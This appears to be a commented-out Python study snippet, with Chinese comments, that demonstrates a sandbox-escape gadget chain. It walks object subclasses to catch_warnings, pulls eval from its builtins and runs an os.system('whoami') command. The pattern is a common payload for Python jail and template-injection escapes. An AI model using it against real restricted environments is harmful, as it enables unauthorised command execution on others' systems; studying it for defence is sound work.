import warnings
# print(type([])) #<class 'list'>
# print([].__class__.__base__) #<class 'object'>
# print([].__class__.__base__.__subclasses__()) #列出所有子类

# 遍历找到eval函数
# for class_item in [].__class__.__base__.__subclasses__():
#     # print(class_item)
#     if class_item.__name__ == 'catch_warnings':
#         print(class_item.__name__)
#         for item in class_item.__init__.__globals__['__builtins__'].items(): #__builtins__#
#             # print(item) #eval
#             if 'eval' in item:
#                 # print(item)
#                 print(item[1]('__import__("os").system("whoami")'))
#
#
# print([].__class__.__base__.__subclasses__())
# print(warnings.catch_warnings.__init__.__globals__['__builtins__']['eval'])

#eval() #函数 执行字符串表达式
# result = eval('__import__("os").system("whoami")')
# print(result)
